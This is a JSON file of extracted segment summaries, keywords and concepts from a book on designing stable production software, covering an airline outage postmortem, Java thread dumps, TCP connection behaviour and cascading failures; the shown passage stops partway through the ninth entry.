[
  {
    "chapter_number": 1,
    "title": "Segment 1 (pages 3-10)",
    "start_page": 3,
    "end_page": 10,
    "summary": "Second Edition Design and Deploy Production-Ready Software\nWhere those designations appear in this book, and The Pragmatic Programmers, LLC was aware of a trademark claim, the designations have been printed in initial capital letters or in all capitals.\nThe Pragmatic Starter Kit, The Pragmatic Programmer, Pragmatic Programming, Pragmatic Bookshelf, PragProg and the linking g device are trade- marks of The Pragmatic Programmers, LLC.\nOur Pragmatic books, screencasts, and audio books can help you and your team create better software and have more fun.\n. Aiming for the Right Target The Scope of the Challenge A Million Dollars Here, a Million Dollars There Use the Force Pragmatic Architecture Wrapping Up\nPart I — Create Stability\nDefining Stability Extending Your Life Span Failure Modes Stopping Crack Propagation Chain of Failure Wrapping Up\nStability Antipatterns Integration Points Chain Reactions Cascading Failures Users Blocked Threads Self-Denial Attacks Scaling Effects Unbalanced Capacities Dogpile Force Multiplier Slow Responses Unbounded Result Sets Wrapping Up\nStability Patterns Timeouts Circuit Breaker Bulkheads Steady State Fail Fast Let It Crash Handshaking Test Harnesses Decoupling Middleware Shed Load Create Back Pressure Governor Wrapping Up\nPart II — Design for Production\nCode Configuration Transparency Wrapping Up\nInterconnect Solutions at Different Scales DNS Load Balancing Demand Control Network Routing Discovering Services Migratory Virtual IP Addresses Wrapping Up\nMechanical Advantage Platform and Ecosystem Development Is Production System-Wide Transparency Configuration Services Provisioning and Deployment Services Command and Control The Platform Players The Shopping List Wrapping Up\nConfigured Passwords Security as an Ongoing Process Wrapping Up\nSo Many Machines The Fallacy of Planned Downtime Automated Deployments Continuous Deployment Phases of Deployment Deploy Like the Pros Wrapping Up\nHelp Others Handle Your Versions Handle Others’ Versions Wrapping Up\nFinally, a huge thank you to Andy Hunt, Katharine Dvorak, Susannah Davidson Pfalzer, and the whole team at The Pragmatic Bookshelf.",
    "keywords": [
      "Pragmatic Bookshelf Raleigh",
      "Pragmatic Programmers",
      "Pragmatic Bookshelf",
      "Pragmatic Architecture Wrapping",
      "Pragmatic",
      "Wrapping",
      "Pragmatic Starter Kit",
      "Force Pragmatic Architecture",
      "Case Study",
      "Pragmatic books",
      "Architecture Wrapping",
      "Pragmatic Programming",
      "Pragmatic Starter",
      "Bookshelf Raleigh",
      "book"
    ],
    "concepts": [
      "wrapping",
      "contents",
      "stability",
      "stabilize",
      "editor",
      "book",
      "books",
      "pragmatic",
      "load",
      "design"
    ]
  },
  {
    "chapter_number": 2,
    "title": "Segment 2 (pages 11-18)",
    "start_page": 11,
    "end_page": 18,
    "summary": "In this book, you will examine ways to architect, design, and build software —particularly distributed systems—for the muck and mire of the real world.\nYou’ll take a hard look at software that failed the test and find ways to make sure your software survives contact with the real world.\nI’ve targeted this book to architects, designers, and developers of distributed software systems, including websites, web services, and EAI projects, among others.\nIf anybody has to go home for the day because your software stops working, then this book is for you.\nIn Part II: Design for Production, you’ll see what it means to live in production.\nReal money is on the line when systems fail.\nSoftware design as taught today is terribly incomplete.\nToo often, project teams aim to pass the quality assurance (QA) department’s tests instead of aiming for life in production.\nBut testing—even agile, pragmatic, automated testing—is not enough to prove that software is ready for the real world.\nLiving in Production • 2\nMost software is designed for the development lab or the testers in the QA department.\nIt is designed and built to pass tests such as, “The customer’s first and last names are required, but the middle initial is optional.” It aims to survive the artificial realm of QA, not the real world of production.\nSoftware design today resembles automobile design in the early ’90s—discon- nected from the real world.\nCars designed solely in the cool comfort of the lab looked great in models and CAD systems.\nMost software architecture and design happens in equally clean, distant environs.\nYou want to own a car designed for the real world.\nProduct designers in manufacturing have long pursued “design for manufac- turability”—the engineering approach of designing products such that they can be manufactured at low cost and high quality.\nPrior to this era, product designers and fabricators lived in different worlds.\nfor production.” We don’t hand designs to fabricators, but we do hand finished software to IT operations.\nWe need to design individual software systems, and the whole ecosystem of interdependent systems, to operate at low cost and high quality.\nAs an engineer, I expect it to either be “24 by 365” or be “24 by 7 by 52.”) Clearly, we’ve made tremendous strides even to consider the scale of software built today; but with the increased reach and scale of our systems come new ways to break, more hostile environments, and less tolerance for defects.\nThe increasing scope of this challenge—to build software fast that’s cheap to build, good for users, and cheap to operate—demands continually improving architecture and design techniques.\nDesigns appropriate for small WordPress websites fail outrageously when applied to large scale, transactional, distribut- ed systems, and we’ll look at some of those outrageous failures.\nSystems built for QA often require so much ongoing expense, in the form of operations cost, downtime, and software maintenance, that they never reach profitability, let alone net positive cash for the business (reached only after the profits gener- ated by the system pay back the costs incurred in building it.) These systems exhibit low availability, direct losses in missed revenue, and indirect losses through damage to the brand.\nDuring the hectic rush of a development project, you can easily make decisions that optimize development cost at the expense of operational cost.\nLiving in Production • 4\nSystems spend much more of their life in operation than in develop- ment—at least, the ones that don’t get canceled or scrapped do.\nAvoiding a one-time developmental cost and instead incurring a recurring operational cost makes no sense.\n(Most companies would like to do more releases per year, but I’m being very conservative.) You can compute the expected cost of downtime, dis- counted by the time-value of money.\nDesign and architecture decisions are also financial decisions.\nThe emphasis on early delivery and incremental improvements means software gets into production quickly.\nSince production is the only place to learn how the software will respond to real-world stimuli, I advocate any approach that begins the learning process as soon as possible.\nThese examples all come from real systems I’ve worked on.\nContrast that to the pragmatic architect’s creation, in which each component is good enough for the current stresses—and the architect knows which ones need to be replaced depending on how the stress factors change over time.\nIf you’re an ivory-tower architect—and you haven’t already stopped reading—then this book might entice you to descend through a few levels of abstraction to get back in touch with that vital intersection of soft- ware, hardware, and users: living in production.\nSoftware delivers its value in production.\nThis book deals with life in production, from the initial release through ongoing growth and evolution of the system.",
    "keywords": [
      "systems",
      "system",
      "software",
      "Production",
      "design",
      "’ll",
      "book",
      "Part",
      "real",
      "real world",
      "software systems",
      "cost",
      "architect",
      "report erratum",
      "distributed software systems"
    ],
    "concepts": [
      "systems",
      "systemic",
      "design",
      "designers",
      "designed",
      "designs",
      "designer",
      "software",
      "production",
      "product"
    ]
  },
  {
    "chapter_number": 3,
    "title": "Segment 3 (pages 19-26)",
    "start_page": 19,
    "end_page": 26,
    "summary": "It started with a planned failover on the database cluster that served the core facilities (CF).\nThe airline was moving toward a service-oriented architecture, with the usual goals of increasing reuse, decreasing development time, and decreasing operational costs.\nAt this time, CF was in its first generation.\nCF handled flight searches—a common service for any airline application.\nGiven a date, time, city, airport code, flight number, or any combination thereof, CF could find and return a list of flight details.\nWhen this incident happened, the self-service check-in kiosks, phone menus, and “channel partner” applications had been updated to use CF.\nThe development schedule had plans for new releases of the gate agent and call center applications to transition to CF for flight lookup,\nIt ran on a cluster of J2EE application servers with a redundant Oracle 9i database.\nThe Oracle database server ran on one node of the cluster at a time, with Veritas Cluster Server controlling the database server, assigning the virtual IP address, and mounting or unmounting filesystems from the RAID array.\nUp front, a pair of redundant hardware load balancers directed incoming traffic to one of the application servers.\nClient applications like the server for check-in kiosks and the IVR system would connect to the front-end virtual IP address.\nCF did not suffer from any of the usual single-point-of-failure problems.\nAs was the case with most of my large clients, a local team of engineers dedi- cated to the account operated the airline’s infrastructure.\nOn the night the problem started, the local engineers had executed a manual database failover from CF database 1 to CF database 2 (see diagram).\nCF Database 1\nCF Database 2\nThe application servers couldn’t even tell that anything had changed, because they were configured to connect to the virtual IP address only.\nThe client scheduled this particular change for a Thursday evening around 11 p.m. Pacific time.\nOne of the engineers from the local team worked with the operations center to execute the change.\nThe whole time, routine site monitoring showed that the applications were continuously available.\nFortunately, the team had created scripts long ago to take thread dumps of all the Java applications and snapshots of the databases.\nThey also tried restarting one of the kiosks’ application servers.\nIt happened at almost the same time, close enough that the difference could just be latency in the separate monitoring tools that the kiosks and IVR applications used.\nAs you can see from the dependency diagram on page 13, that was a big finger pointing at CF, the only common dependency shared by the kiosks and the IVR system.\nThe fact that CF had a database failover three hours before this\nCF\nAs it turns out, the monitoring application was only hitting a status page, so it did not really say much about the real health of the CF appli- cation servers.\nThis outage was approaching the one-hour SLA limit, so the team decided to restart each of the CF applica- tion servers.\nAs soon as they restarted the first CF application server, the IVR systems began recovering.\nOnce all CF servers were restarted, IVR was green but the kiosks still showed red.\nOn a hunch, the lead engineer decided to restart the kiosks’ own application servers.\nThe total elapsed time for the incident was a little more than three hours.\nThe FAA measures on-time arrivals and departures as part of the airline’s annual report card.\nAt 10:30 a.m. Pacific time, eight hours after the outage started, our account representative, Tom (not his real name) called me to come down for a post- mortem.\nIn operations, “post hoc, ergo propter hoc”—Latin for “you touched it last”—turns out to be a good starting point most of the time.\nIn fact, when Tom called me, he asked me to fly there to find out why the database failover caused this outage.\nDid the database failover cause the outage?\nSome are reliable, such as server logs copied from the time of the outage.\nThe failure might have left traces in the log files or monitoring data collected from that time, or it might not.\nFrom the database servers, I needed configuration files for the databases and the cluster server.\nThe backup ran before the outage, so that would tell me whether any configurations were changed between the backup and my investigation.",
    "keywords": [
      "Create Stability",
      "database",
      "time",
      "application servers",
      "servers",
      "Oracle database server",
      "Airline",
      "database failover",
      "Outage",
      "server",
      "database server",
      "Veritas Cluster Server",
      "virtual IP address",
      "Exception That Grounded",
      "IVR"
    ],
    "concepts": [
      "servers",
      "server",
      "time",
      "times",
      "application",
      "applications",
      "flight",
      "flights",
      "database",
      "databases"
    ]
  },
  {
    "chapter_number": 4,
    "title": "Segment 4 (pages 27-34)",
    "start_page": 27,
    "end_page": 34,
    "summary": "I was looking for common problems with clusters: not enough heartbeats, heartbeats going through switches that carry produc- tion traffic, servers set to use physical IP addresses instead of the virtual address, bad dependencies among managed packages, and so on.\nNext, it was time to move on to the application servers’ configuration.\nThe local engineers had made copies of all the log files from the kiosk application servers during the outage.\nBetter still, thread dumps were available in both sets of log files.\nAs a longtime Java programmer, I love Java thread dumps for debugging application hangs.\nArmed with a thread dump, the application is an open book, if you know how to read it.\nWhat third-party libraries an application uses • What kind of thread pools it has • How many threads are in each • What background processing the application uses • What protocols the application uses (by looking at the classes and methods in each thread’s stack trace)\nGetting Thread Dumps\nAny Java application will dump the state of every thread in the JVM when you send it a signal 3 (SIGQUIT) on UNIX systems or press Ctrl+Break on Windows systems.\nOne catch about the thread dumps triggered at the console: they always come out on “standard out.” Many canned startup scripts do not capture standard out, or they send it to /dev/null.\nLog files produced with Log4j or java.util.logging cannot show thread dumps.\nYou might have to experiment with your application server’s startup scripts to get thread dumps.\nIf you’re allowed to connect to the JVM directly, you can use jcmd to dump the JVM’s threads to your terminal:\nHere is a small portion of a thread dump:\nat org.apache.tomcat.util.net.TcpWorkerThread.runIt(PoolTcpEndpoint.java:549) at org.apache.tomcat.util.threads.ThreadPool$ControlRunnable.\\\nat java.lang.Thread.run(Thread.java:534)\nwaiting on <0xacede700> (a \\ org.apache.tomcat.util.threads.ThreadPool$ControlRunnable) at java.lang.Object.wait(Object.java:429) at org.apache.tomcat.util.threads.ThreadPool$ControlRunnable.\\\nrun(ThreadPool.java:655) - locked <0xacede700> (a org.apache.tomcat.util.threads.ThreadPool$ControlRunnable)\nat java.lang.Thread.run(Thread.java:534)\nNumber 25 is in a runnable state, whereas thread 24 is blocked in Object.wait().\nThe thread dumps for the kiosks’ application servers showed exactly what I would expect from the observed behavior during the incident.\nOut of the forty threads allocated for handling requests from the individual kiosks, all forty were blocked inside SocketInputStream.socketRead0(), a native method inside the internals of Java’s socket library.\nThe kiosk application server’s thread dump also gave me the precise name of the class and method that all forty threads had called: FlightSearch.lookupByCity().\nThe picture got clearer as I investigated the thread dumps from CF.\nCF’s application server used separate pools of threads to handle EJB calls and HTTP requests.\nThe HTTP threads were almost entirely idle, which makes sense for an EJB server.\nThe EJB threads, on the other hand, were all completely in use processing calls to Flight- Search.lookupByCity().\nIn fact, every single thread on every application server was blocked at exactly the same line of code: attempting to check out a database connection from a resource pool.\nConnection conn = null; Statement stmt = null;\nIt turns out that java.sql.Statement.close() can throw a SQLException.\nTo create a statement, the driver’s connection object checks only its own internal status.\n(This might be a quirk peculiar to certain versions of Oracle’s JDBC drivers.) If the JDBC connection thinks it’s still connected, then it will create the statement.\nBut closing the statement will also throw a SQLException, because the driver will attempt to tell the database server to release resources associated with that statement.\nThe key lesson to be drawn here, though, is that the JDBC specification allows java.sql.Statement.close() to throw a SQLException, so your code has to handle it.\nIn the previous offending code, if closing the statement throws an exception, then the connection does not get closed, resulting in a resource leak.\nThat is exactly what I saw in the thread dumps from CF.\nWhen such staggering costs result from such a small error, the natural response is to say, “This must never happen again.” (I’ve seen ops managers pound their shoes on a table like Nikita Khrushchev while declaring, “This must never happen again.”) But how can it be prevented?\nCynical software expects bad things to happen and is never surprised when they do.\nStabilize Your System • 24\nThe word system means the complete, interdependent set of hardware, applications, and services required to process transactions for users.\nThis is what most people mean by “stability.” It’s not just that your indi- vidual servers or applications stay up and running but rather that the user can still get work done.",
    "keywords": [
      "thread dumps",
      "thread",
      "system",
      "Java thread dumps",
      "application",
      "threads",
      "application server",
      "JDBC connection",
      "dumps",
      "report erratum",
      "connection",
      "Java application",
      "EJB",
      "JDBC",
      "Java"
    ],
    "concepts": [
      "java",
      "thread",
      "threads",
      "application",
      "applications",
      "servers",
      "server",
      "report",
      "reported",
      "processing"
    ]
  },
  {
    "chapter_number": 5,
    "title": "Segment 5 (pages 35-42)",
    "start_page": 35,
    "end_page": 42,
    "summary": "A load test runs for a specified period of time and then quits.\nLoad-testing vendors charge large dollars per hour, so nobody asks them to keep the load running for a week at a time.\nFailure Modes\nSudden impulses and excessive strain can both trigger catastrophic failure.\nChiles refers to these as “cracks in the system.” He draws an analogy between a complex system on the verge of failure and a steel plate with a microscopic crack in the metal.\nThe original trigger and the way the crack spreads to the rest of the system, together with the result of the damage, are collectively called a failure mode.\nNo matter what, your system will have a variety of failure modes.\nOnce you accept that failures will happen, you have the ability to design your system’s reaction to specific failures.\nStopping Crack Propagation • 27\ncreate safe failure modes that contain the damage and protect the rest of the system.\nChiles calls these protections “crackstoppers.” Like building crumple zones to absorb impacts and keep car passengers safe, you can decide what features of the system are indispensable and build in failure modes that keep cracks away from those features.\nIf you do not design your failure modes, then you’ll get whatever unpredictable—and usually dangerous—ones happen to emerge.\nLet’s see how the design of failure modes applies to the grounded airline from before.\n(This happened independently in each application server instance.) The pool could have been configured to create more connections if it was exhausted.\nAt a certain point in time, CF could also have decided to build an HTTP-based web service instead of EJBs. Then the client could set a timeout on its HTTP requests.\nThe clients might also have written their calls so the blocked threads could be jettisoned, instead of having the request-handling thread make the external integration call.\nNone of these were done, so the crack propagated from CF to all systems that used CF.\n(In this case, all the service groups would have cracked in the same way, but that would not always be the case.) This is another way of stopping cracks from propagating into the rest of the enterprise.\nChain of Failure\nLooking at the entire chain of failure after the fact, the failure seems inevitable.\nThe combination of events that caused the failure is not independent.\nIf the database gets slow, then the application servers are more likely to run out of memory.\nChain of Failure • 29\nFailure is in the eye of the beholder...a computer may have the power on but not respond to any requests.\nTriggering a fault opens the crack.\nFaults become errors, and errors provoke failures.\nAt each step in the chain of failure, the crack from a fault may accelerate, slow, or stop.\nA highly complex system with many degrees of coupling offers more pathways for cracks to propagate along, more opportunities for errors.\nFor instance, the tight coupling of EJB calls allowed a resource exhaustion problem in CF to create larger problems in its callers.\nCoupling the request-handling threads to the external integration calls in those systems caused a remote problem to turn into downtime.\nOne way to prepare for every possible failure is to look at every external call, every I/O, every use of resources, and every expected outcome and ask, “What are all the ways this can go wrong?” Think about the different types of impulse and stress that can be applied:\nOne camp says we need to make systems fault-tolerant.\nYou have to decide for your system whether it’s better to risk failure or errors— even while you try to prevent failures and errors.\nEvery production failure is unique.\nNo two incidents will share the precise chain of failure: same triggers, same fracture, same propagation.\nOver time, however, patterns of failure do emerge.\nChapter 4, Stability Antipatterns, on page 31, deals with these patterns of failure.\nBut these patterns stop cracks from propagating.\nIn other words, it’s time to look at the antipatterns that will kill your systems.\nBig systems serve more users by commanding more resources; but in many failure modes big systems fail faster than small systems.\nChiles calls in Inviting Disaster [Chi01] the “technology frontier,” where the twin specters of high interactive complexity and tight coupling conspire to turn rapidly moving cracks into full-blown failures.\nSuch linkages con- tribute to “problem inflation,” turning a minor fault into a major failure.\nTight coupling allows cracks in one part of the system to propagate themselves —or multiply themselves—across layer or system boundaries.\nA failure in one component causes load to be redistributed to its peers and introduces delays and stress to its callers.\nThat in turn makes the next failure more likely, eventually resulting in total collapse.\nIn your systems, tight coupling can appear within application code, in calls between systems, or any place a resource has multiple consumers.",
    "keywords": [
      "system",
      "Failure",
      "Failure Modes",
      "systems",
      "cracks",
      "crack",
      "time",
      "failures",
      "n’t",
      "report erratum",
      "antipatterns",
      "system failure",
      "calls",
      "patterns",
      "Modes"
    ],
    "concepts": [
      "failure",
      "failures",
      "systems",
      "cracks",
      "crack",
      "cracked",
      "errors",
      "error",
      "called",
      "calls"
    ]
  },
  {
    "chapter_number": 6,
    "title": "Segment 6 (pages 43-50)",
    "start_page": 43,
    "end_page": 50,
    "summary": "A butterfly has a central system with a lot of feeds and connections fanning into it on one side and a large fan out on the other side, as shown in the figure that follows.\nA butterfly style has 2N connections, a spiderweb might have up to\nAll these connections are integration points, and every single one of them is out to destroy your system.\nIt came time to identify all the production firewall rules so we could open holes in the firewall to allow authorized connections to the production system.\nWe had already gone through the usual suspects: the web servers’ connections to the application server, the application server to the database server, the cluster manager to the cluster nodes, and so on.\nWhen it came time to add rules for the feeds in and out of the production environment, we were pointed toward the project manager for enterprise integration.\nHe pulled up his database of integrations and ran a custom report to give us the connection specifics.\nThe simplest failure mode occurs when the remote system refuses connections.\nThe calling system must deal with connection failures.\nUsually, this isn’t much of a problem, since everything from C to Java to Elm has clear ways to indicate a connection failure—either an exception in languages that have them or a magic return value in ones that don’t.\nLike a lot of other things we work with, this arrow is an abstraction for a network connection.\nAll you will ever see on the network itself are packets.\nBetween electrons and a TCP connection are many layers of abstraction.\nFortunately, we get to choose whichever level of abstraction is useful at any given point in time.) These packets are the Internet Protocol (IP) part of TCP/IP.\nTransmission Control Protocol (TCP) is an agreement about how to make something that looks like a continuous connection out of discrete packets.\nThe figure on page 37 shows the “three-way handshake” that TCP defines to open a connection.\nThe connection starts when the caller (the client in this scenario, even though it is itself a server for other applications) sends a SYN packet to a port on the remote server.\nIf nobody is listening to that port, the remote server immedi- ately sends back a TCP “reset” packet to indicate that nobody’s home.\nIf an application is listening to the destination port, then the remote server sends back a SYN/ACK packet indicating its willingness to accept the connec- tion.\nThese three packets have now established the “connection,” and the applications can send data back and forth.\n(For what it’s worth, TCP also defines the “simultaneous open” handshake, in which both machines send SYN packets to each other before a SYN/ACK.\nSuppose, though, that the remote application is listening to the port but is absolutely hammered with connection requests, until it can no longer service the incoming connections.\nThe port itself has a “listen queue” that defines how many pending connections (SYN sent, but no SYN/ACK replied) are allowed by the network stack.\nWhile the socket is in that partially formed state, whichever thread called open() is blocked inside the OS kernel until the remote application finally gets around to accepting the connection or until the connection attempt times out.\nThe calling application’s thread could be blocked waiting for the remote server to respond for ten minutes!\nNearly the same thing happens when the caller can connect and send its request but the server takes a long time to read the request and send a response.\nThe site was running on around thirty different instances, so something was happening to make all thirty different application server instances hang within a five-minute window (the resolution of our URL pinger).\nRestarting the application servers always cleared it up, so there was some transient effect that tipped the site over at that time.\nRestarting all the application servers just as people started to hit the site in earnest was what you’d call a suboptimal approach.\nOn the third day that this occurred, I took thread dumps from one of the afflicted application servers.\nThe instance was up and running, but all request- handling threads were blocked inside the Oracle JDBC library, specifically inside of OCI calls.\n(We were using the thick-client driver for its superior failover features.) In fact, once I eliminated the threads that were just blocked trying to enter a synchronized method, it looked as if the active threads were all in low-level socket read or write calls.\nWe can go much faster when we talk about fetching a document from a URL than if we have to discuss the tedious details of connection setup, packet framing, acknowledgments, receive windows, and so on.\nWhether for a problem diagnosis or performance tuning, packet capture tools are the only way to understand what’s really happening on the network.\ntcpdump is a common UNIX tool for capturing packets from a network interface.\nRunning it in “promiscuous” mode instructs the network interface card (NIC) to receive all packets that cross its wire—even those addressed to other computers.\nThe first packet shows an address routing protocol (ARP) request.\nPackets 5, 6, and 7 are the three-phase handshake for a TCP connection setup.\nNote that the pane below the packet trace shows the layers of encapsulation that the TCP/IP stack created around the HTTP request in the second packet.\nFinally, the payload of the TCP packet is an HTTP request.\nA handful of packets were being sent from the application servers to the database servers, but with no replies.\nAlso, nothing was coming from the database to the application servers.\nBy this time, we had to restart the application servers.\nI said before that socket connections are an abstraction.\nOnce established, a TCP connection can exist for days without a single packet being sent by either side.\nThe rules say such things as “connections originating from 192.0.2.0/24 to 192.168.1.199 port 80 are allowed.” When the firewall sees an incoming SYN packet, it checks it against its rule base.\nThe packet might be allowed (routed to the destination network), rejected (TCP reset packet sent back to origin), or ignored (dropped on the floor with no response at all).\nIf the connection is allowed, then the firewall makes an entry in its own internal table that says something like “192.0.2.98:32770 is connected to 192.168.1.199:80.” Then all future packets,",
    "keywords": [
      "Svc Svc Svc",
      "Svc Svc",
      "Svc Svc UserRole",
      "Caller Svc Svc",
      "Downstream Svc Svc",
      "Svc",
      "Svc Svc Upstream",
      "Svc UserRole Svc",
      "UserRole Svc Svc",
      "Caller Caller Svc",
      "connection",
      "packet",
      "application servers",
      "server",
      "TCP"
    ],
    "concepts": [
      "packets",
      "packet",
      "connections",
      "connection",
      "connect",
      "connected",
      "servers",
      "server",
      "networking",
      "network"
    ]
  },
  {
    "chapter_number": 7,
    "title": "Segment 7 (pages 51-58)",
    "start_page": 51,
    "end_page": 58,
    "summary": "Along with the endpoints of the connection, the firewall also keeps a “last packet” time.\nIf too much time elapses without a packet on a connection, the firewall assumes that the endpoints are dead or gone.\nThe endpoints assume their connection is valid for an indefinite length of time, even if no packets are crossing the wire.\na 2.6 series kernel, has its tcp_retries2 set to the default value of 15, which results in a twenty-minute timeout before the TCP/IP stack will inform the socket library that the connection is broken.\nDuring the slow overnight times, traffic volume was light enough that a single database connection would get checked out of the pool, used, and checked back in.\nThen the next request would get the same connection, leaving the thirty-nine others to sit idle until traffic started to ramp up.\nOnce traffic started to ramp up, those thirty-nine connections per application server would get locked up immediately.\nEven if the one connection was still being used to serve pages, sooner or later it would be checked out by a thread that ended up blocked on a connection from one of the other pools.\nThen the one good connection would be held by a blocked thread.\nThe resource pool has the ability to test JDBC connections for validity before checking them out.\nIt checked validity by executing a SQL query like “SELECT SYSDATE FROM DUAL.” Well, that would’ve just make the request-handling thread hang anyway.\nWe were starting to look at some really hairy complexities, such as creating a “reaper” thread to find connections that were close to getting too old and tearing them down before they timed out.\nOracle has a feature called dead connection detection that you can enable to discover when clients have crashed.\nWhen enabled, the database server sends a ping packet to the client at some periodic interval.\nIf the client fails to respond after a few retries, the database server assumes the client has crashed and frees up all the resources held by that connection.\nThe ping packet itself, however, was what we needed to reset the firewall’s “last packet” time for the connection, keeping the connection alive.\nThe provider may accept the TCP connection but never respond to the\nThe provider may accept the connection but not read the request.\nThe provider may send back a response with a content type the caller doesn’t expect or know how to handle, such as a generic web server 404 page in HTML instead of a JSON response.\nUse a client library that allows fine-grained control over timeouts—including both the connection timeout and read timeout—and response handling.\nThat might be true of the server software they sell, but it’s rarely true for their client libraries.\nUsually, software vendors provide client API libraries that have a lot of problems and often have stability risks.\nWhether it’s an internal resource pool, socket read calls, HTTP connections, or just plain old Java serialization, vendor API libraries are peppered with unsafe coding practices.\nstability_anti_patterns/Connection.java public interface Connection {\nDepending on the threading model inside the client library and how long your callback method takes, synchronizing the callback method could block threads inside the client library.\nAs always, once all the request-handling threads are blocked, your application might as well be down.\nThe most effective stability patterns to combat integration point failures are Circuit Breaker on page 95 and Decoupling Middleware on page 117.\nTo make sure your software is cynical enough, you should make a test harness —a simulator that provides controllable behavior—for each integration test.\nEvery integration point will eventually fail in some way, and you need to be prepared for that failure.\nDebugging integration point failures usually requires peeling back a layer of abstraction.\nIf your system scales horizontally, then you will have load-balanced farms or clusters where each server runs the same applications.\nStill, even though horizontal clusters are not susceptible to single points of failure (except in the case of attacks of self-denial; see Self-Denial Attacks, on page 69), they can exhibit a load-related failure mode.\nFor example, in the eight-server farm shown in the figure on page 47, each node handles 12.5 percent of the total load.\nEach of the remaining seven servers must handle about 14.3 percent of the total load.\nEven though each server has to take only 1.8 percent more of the total workload, that server’s load increases by about 15 percent.\nIf the first server failed because of some load-related condition, such as a memory leak or intermittent race condition, the surviving nodes become more likely to fail.\nA chain reaction occurs when an application has some defect—usually a resource leak or a load-related crash.\nSplitting a layer into multiple pools—as in the Bulkhead pattern on page 98—can sometimes help by splitting a single chain reaction into two separate chain reactions that occur at different rates.\nWell, for one thing, a chain reaction failure in one layer can easily lead to a cascading failure in a calling layer.\nChain reactions are sometimes caused by blocked threads.\nThis happens when all the request-handling threads in an application get blocked and that applica- tion stops responding.\nIncoming requests will get distributed out to the applica- tions on other servers in the same layer, increasing their chance of failure.\nA dozen search engines sitting behind a hardware load balancer handled holiday traffic.\nThe application servers would connect to a virtual IP address instead of specific search engines (see Migratory Virtual IP Addresses, on page 189, for more about load balancing and virtual IP addresses).\nThe load balancer then distribut- ed the application servers’ queries out to the search engines.\nThe load balancer also performed health checks to discover which servers were alive and responsive so it could make sure to send queries only to search engines that were alive.\nAs each search engine went dark, the load balancer would send their share of the queries to the remaining servers, causing them to run out of memory even faster.\nLosing the last search server caused the entire front end to lock up completely.\nA chain reaction happens because the death of one server makes the others pick up the slack.",
    "keywords": [
      "Server",
      "connection",
      "load",
      "integration point failures",
      "integration point",
      "servers",
      "client",
      "TCP",
      "failure",
      "chain reaction",
      "Integration",
      "Clients Server",
      "Load Balancer",
      "chain",
      "n’t"
    ],
    "concepts": [
      "server",
      "servers",
      "connection",
      "connections",
      "connect",
      "failure",
      "failures",
      "response",
      "responses",
      "responsive"
    ]
  },
  {
    "chapter_number": 8,
    "title": "Segment 8 (pages 59-66)",
    "start_page": 59,
    "end_page": 66,
    "summary": "Cascading Failures • 49\nMost of the time, a chain reaction happens when your application has a memory leak.\nAs one server runs out of memory and goes down, the other servers pick up the dead one’s burden.\nThe increased traffic means they leak memory faster.\nCascading Failures\nA cascading failure occurs when a crack in one layer triggers a crack in a calling layer.\nIf the caller handles it badly, then the caller will also start to fail, resulting in a cascading failure.\n(Just like we draw trees upside-down with their roots pointing to the sky, our problems cascade upward through the layers.)\nCascading failures require some mechanism to transmit the failure from one layer to another.\nThe failure “jumps the gap” when bad behavior in the calling layer gets triggered by the failure condition in the provider.\nCascading failures often result from resource pools that get drained because of a failure in a lower layer.\nIntegration points without timeouts are a surefire way to create cascading failures.\nAt some point, the lower layer was suffering from a race condition that would make it kick out an error once in a while for no good reason.\nAs a result, once the lower layer started to have some real problems (losing packets from the database because of a failed switch), the caller started to pound it more and more.\nUltimately, the calling layer was using 100 percent of its CPU making calls to the lower layer and logging failures in calls to the lower layer.\nJust as integration points are the number-one source of cracks, cascading failures are the number-one crack accelerator.\nThe most effective patterns to combat cascading failures are Circuit Breaker and Timeouts.\nA cascading failure occurs when cracks jump from one system or layer to another, usually because of insufficiently paranoid integration points.\nA cascading failure can also happen after a chain reaction in a lower layer.\nA cascading failure often results from a resource pool, such as a connec- tion pool, that gets exhausted when none of its calls return.\nUsers\nHuman users have a gift for doing exactly the worst possible thing at the worst possible time.\nExcess traffic can stress the memory system in several ways.\nAssuming you use memory-based ses- sions (see Off-Heap Memory, Off-Host Memory, on page 54, for an alternative to in-memory sessions), the session stays resident in memory for a certain length of time after the last request from that user.\nEvery additional user means more memory.\nDuring that dead time, the session still occupies valuable memory.\nEvery object you put into the session sits there in memory, tying up precious bytes that could be serving some other user.\nWhen memory gets short, a large number of surprising things can happen.\nProbably the least offensive is throwing an out-of-memory exception at the user.\n(This, by the way, is a great argument for external monitoring in addition to log file scraping.) A supposedly recoverable low-memory situation will rapidly turn into a serious stability problem.\nYour best bet is to keep as little in the in-memory session as possible.\nIt would be wonderful if there was a way to keep things in the session (therefore in memory) when memory is plentiful but automatically be more frugal when memory is tight.\nThe basic idea is that a weak reference holds another object, called the payload, but only until the garbage collector needs to reclaim memory.\nYou construct a weak reference with the large or expensive object as the payload.\nThink about using a third-party or open source caching library that uses weak references to reclaim memory.\nWhen memory gets low, the garbage collector is allowed to reclaim any weakly reachable objects.\nYou have to read your runtime’s docs very carefully, but usually the only guarantee is that weakly reachable objects will be reclaimed before an out-of-memory error occurs.\nWeak references are a useful way to respond to changing memory conditions, but they do add complexity.\nAnother effective way to deal with per-user memory is to farm it out to a dif- ferent process.\nRedis is another popular tool for moving memory out of your process.4 It’s a fast “data structure server” that lives in a space between cache and database.\nMany systems use Redis to hold session data instead of keeping it in memory or in a relational database.\nYou may not spend much time thinking about the number of sockets on your server, but that’s another limit you can run into when traffic gets heavy.\nEach IP address has its own range of port numbers, so we would need a total of 16 IP addresses to handle that many connections.\nTIME_WAIT is a delay period before the socket can be reused for a new connection.\nIf the socket were reused too quickly, then a bogon could arrive with the exact right com- bination of IP address, destination port number, and TCP sequence number to be accepted as legitimate data for the new connection.\nThat’s already as many pages as a typical user’s entire session.\nThe best thing you can do about expensive users is test aggressively.",
    "keywords": [
      "memory",
      "System",
      "Cascading Failures",
      "lower layer",
      "layer",
      "Failures System failures",
      "failure",
      "Users",
      "Failures",
      "time",
      "Cascading",
      "Cascading Failures System",
      "Circuit Breaker",
      "user",
      "systems"
    ],
    "concepts": [
      "memory",
      "users",
      "user",
      "session",
      "sessions",
      "uses",
      "useful",
      "layer",
      "layers",
      "gets"
    ]
  },
  {
    "chapter_number": 9,
    "title": "Segment 9 (pages 67-74)",
    "start_page": 67,
    "end_page": 74,
